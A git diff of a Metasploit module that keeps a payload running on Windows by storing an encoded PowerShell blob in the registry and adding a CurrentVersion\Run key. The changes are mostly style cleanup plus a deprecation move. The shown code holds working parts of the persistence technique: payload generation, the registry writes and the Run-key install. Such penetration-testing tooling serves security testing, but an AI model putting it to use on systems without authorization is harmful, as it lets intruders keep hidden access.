@@ -9,57 +9,59 @@ class MetasploitModule < Msf::Exploit::Local
   include Msf::Exploit::Powershell
   include Msf::Post::Windows::Registry
   include Msf::Post::File
+  include Msf::Exploit::Deprecated
+  moved_from 'exploits/windows/local/registry_persistence'
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Windows Registry Only Persistence',
-      'Description'    => %q{
-        This module will install a payload that is executed during boot.
-        It will be executed either at user logon or system startup via the registry
-        value in "CurrentVersion\Run" (depending on privilege and selected method).
-        The payload will be installed completely in registry.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows Registry Only Persistence',
+        'Description' => %q{
+          This module will install a payload that is executed during boot.
+          It will be executed either at user logon or system startup via the registry
+          value in "CurrentVersion\Run" (depending on privilege and selected method).
+          The payload will be installed completely in registry.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
           'Donny Maasland <donny.maasland[at]fox-it.com>',
         ],
-      'Platform'       => [ 'win' ],
-      'SessionTypes'   => [ 'meterpreter', 'shell' ],
-      'Targets'        =>
-        [
-          [ 'Automatic', { } ]
+        'Platform' => [ 'win' ],
+        'SessionTypes' => [ 'meterpreter', 'shell' ],
+        'Targets' => [
+          [ 'Automatic', {} ]
         ],
-      'DefaultTarget'  => 0,
-      'DisclosureDate' => '2015-07-01',
-      'DefaultOptions' =>
-        {
+        'DefaultTarget' => 0,
+        'DisclosureDate' => '2015-07-01',
+        'DefaultOptions' => {
           'DisablePayloadHandler' => true
         }
-    ))
+      )
+    )
 
     register_options([
       OptEnum.new('STARTUP',
-        [true, 'Startup type for the persistent payload.', 'USER', ['USER','SYSTEM']]),
+                  [true, 'Startup type for the persistent payload.', 'USER', ['USER', 'SYSTEM']]),
       OptString.new('BLOB_REG_KEY',
-        [false, 'The registry key to use for storing the payload blob. (Default: random)' ]),
+                    [false, 'The registry key to use for storing the payload blob. (Default: random)' ]),
       OptString.new('BLOB_REG_NAME',
-        [false, 'The name to use for storing the payload blob. (Default: random)' ]),
+                    [false, 'The name to use for storing the payload blob. (Default: random)' ]),
       OptString.new('RUN_NAME',
-        [false, 'The name to use for the \'Run\' key. (Default: random)' ]),
+                    [false, 'The name to use for the \'Run\' key. (Default: random)' ]),
       OptBool.new('CREATE_RC',
-        [false, 'Create a resource file for cleanup', true]),
+                  [false, 'Create a resource file for cleanup', true]),
       OptInt.new('SLEEP_TIME',
-        [false, 'Amount of time to sleep (in seconds) before executing payload. (Default: 0)', 0]),
+                 [false, 'Amount of time to sleep (in seconds) before executing payload. (Default: 0)', 0]),
     ])
   end
 
   def generate_payload_blob
     opts = {
       wrap_double_quotes: true,
-      encode_final_payload: true,
+      encode_final_payload: true
     }
-    blob = cmd_psh_payload(payload.encoded,payload_instance.arch.first, opts).split(' ')[-1]
+    blob = cmd_psh_payload(payload.encoded, payload_instance.arch.first, opts).split(' ')[-1]
     return blob
   end
 
@@ -82,16 +84,16 @@ class MetasploitModule < Msf::Exploit::Local
   def install_blob(root_path, blob, blob_reg_key, blob_reg_name)
     blob_reg_key = "#{root_path}\\#{blob_reg_key}"
     new_key = false
-    if not registry_enumkeys(blob_reg_key)
+    if !registry_enumkeys(blob_reg_key)
       unless registry_createkey(blob_reg_key)
-        fail_with(Failure::Unknown,"Failed to create key #{blob_reg_key}")
+        fail_with(Failure::Unknown, "Failed to create key #{blob_reg_key}")
       end
       print_good("Created registry key #{blob_reg_key}")
       new_key = true
     end
 
-    unless registry_setvaldata(blob_reg_key, blob_reg_name, blob, "REG_SZ")
-      fail_with(Failure::Unknown,'Failed to open the registry key for writing')
+    unless registry_setvaldata(blob_reg_key, blob_reg_name, blob, 'REG_SZ')
+      fail_with(Failure::Unknown, 'Failed to open the registry key for writing')
     end
     print_good("Installed payload blob to #{blob_reg_key}\\#{blob_reg_name}")
     return new_key
@@ -99,7 +101,7 @@ class MetasploitModule < Msf::Exploit::Local
 
   def install_cmd(cmd, cmd_reg, root_path)
     unless registry_setvaldata("#{root_path}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", cmd_reg, cmd, 'REG_EXPAND_SZ')
-      fail_with(Failure::Unknown,'Could not install run key')
+      fail_with(Failure::Unknown, 'Could not install run key')
     end
     print_good("Installed run key #{root_path}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{cmd_reg}")
   end
@@ -118,15 +120,15 @@ class MetasploitModule < Msf::Exploit::Local
     host = session.session_host
 
     # Create Filename info to be appended to downloaded files
-    filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")
+    filenameinfo = '_' + ::Time.now.strftime('%Y%m%d.%M%S')
 
     # Create a directory for the logs
     if log_path
       logs = ::File.join(log_path, 'logs', 'persistence',
-      Rex::FileUtils.clean_path(host + filenameinfo))
+                         Rex::FileUtils.clean_path(host + filenameinfo))
     else
       logs = ::File.join(Msf::Config.log_directory, 'persistence',
-      Rex::FileUtils.clean_path(host + filenameinfo))
+                         Rex::FileUtils.clean_path(host + filenameinfo))
     end
 
     # Create the log directory
@@ -138,8 +140,8 @@ class MetasploitModule < Msf::Exploit::Local
   end
 
   def create_cleanup(root_path, blob_reg_key, blob_reg_name, cmd_reg, new_key) # Thanks Meatballs for this
-    clean_rc = log_file()
-    @clean_up_rc = ""
+    clean_rc = log_file
+    @clean_up_rc = ''
     @clean_up_rc << "reg deleteval -k '#{root_path}\\#{blob_reg_key}' -v '#{blob_reg_name}'\n"
     if new_key
       @clean_up_rc << "reg deletekey -k '#{root_path}\\#{blob_reg_key}'\n"
@@ -148,30 +150,30 @@ class MetasploitModule < Msf::Exploit::Local
     file_local_write(clean_rc, @clean_up_rc)
     print_status("Clean up Meterpreter RC file: #{clean_rc}")
 
-    report_note(:host => session.session_host,
-      type: 'host.persistance.cleanup',
-      data:  {
-        local_id:     session.sid,
-        stype:        session.type,
-        desc:         session.info,
-        platform:     session.platform,
-        via_payload:  session.via_payload,
-        via_exploit:  session.via_exploit,
-        created_at:   Time.now.utc,
-        commands:     @clean_up_rc
-      }
-    )
+    report_note(host: session.session_host,
+                type: 'host.persistance.cleanup',
+                data: {
+                  local_id: session.sid,
+                  stype: session.type,
+                  desc: session.info,
+                  platform: session.platform,
+                  via_payload: session.via_payload,
+                  via_exploit: session.via_exploit,
+                  created_at: Time.now.utc,
+                  commands: @clean_up_rc
+                })
   end
 
   def check
-    unless registry_enumkeys("HKLM\\SOFTWARE\\Microsoft\\").include?("PowerShell")
+    unless registry_enumkeys('HKLM\\SOFTWARE\\Microsoft\\').include?('PowerShell')
       return Msf::Exploit::CheckCode::Safe
     end
+
     return Msf::Exploit::CheckCode::Vulnerable
   end
 
   def exploit
-    unless registry_enumkeys("HKLM\\SOFTWARE\\Microsoft\\").include?("PowerShell")
+    unless registry_enumkeys('HKLM\\SOFTWARE\\Microsoft\\').include?('PowerShell')
       print_warning('Warning: PowerShell does not seem to be available, persistence might fail')
     end
 
@@ -197,4 +199,3 @@ class MetasploitModule < Msf::Exploit::Local
     end
   end
 end
-
